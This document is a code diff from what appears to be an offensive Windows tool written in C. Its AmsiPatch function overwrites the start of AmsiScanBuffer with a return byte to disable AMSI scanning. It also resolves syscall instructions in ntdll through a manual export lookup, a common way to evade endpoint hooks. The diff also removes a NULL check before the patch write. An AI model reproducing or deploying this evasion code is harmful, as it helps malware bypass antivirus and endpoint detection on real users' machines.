@@ -138,14 +138,13 @@ BOOL AmsiPatch() {
 	HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
 
 	if (hAmsi == NULL) {
+		printf("[x] AMSI not found! \n");
 		return 0;
 	}
 
 	PVOID pAmsiAddr = GetProcAddress(hAmsi, "AmsiScanBuffer");
 
-	if (pAmsiAddr == NULL) {
-		return 0;
-	}
+
 	DWORD oldProtect = 0;
 	if (VirtualProtect(pAmsiAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
 		*(BYTE*)pAmsiAddr = 0xC3;
@@ -155,6 +154,7 @@ BOOL AmsiPatch() {
 		return 1;
 	}
 	else {
+		printf("[-] Failed to patch AMSI!\n");
 		return 0;
 	}
 
@@ -210,9 +210,9 @@ DWORD getSSN(char* funcName) {
 PVOID getSyscallAddr(char* funcName) {
 
 	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
-
-	PVOID pfunc_addr = GetProcAddress(hNtdll, funcName);
+	PVOID pfunc_addr = manual_procaddress((HMODULE)hNtdll, funcName);
 	BYTE* bfunc_addr = (BYTE*)pfunc_addr;
+
 	for (int i = 0; i < 32; i++) {
 		if (bfunc_addr[i] == 0x0F && bfunc_addr[i + 1] == 0x05) {
 			return (PVOID)&bfunc_addr[i];
@@ -225,7 +225,7 @@ BOOL IsElevated() {
 	BOOL elevated = FALSE;
 	HANDLE token = NULL;
 	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
-		TOKEN_ELEVATION elev;
+		TOKEN_ELEVATION elev = { 0 };
 		DWORD size = sizeof(TOKEN_ELEVATION);
 		if (GetTokenInformation(token, TokenElevation, &elev, size, &size)) {
 			elevated = elev.TokenIsElevated;
